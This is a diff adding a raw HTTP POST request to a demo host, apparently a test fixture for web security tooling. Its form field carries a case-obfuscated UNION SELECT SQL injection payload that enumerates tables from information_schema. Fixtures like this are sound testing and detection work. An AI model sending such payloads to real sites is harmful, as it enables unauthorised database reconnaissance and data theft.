@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 69
+Connection: close
+
+redirect=1 uNiOn SeLeCt TaBlE_nAmE fRoM iNfOrMaTiOn_ScHeMa.TaBlEs-- -
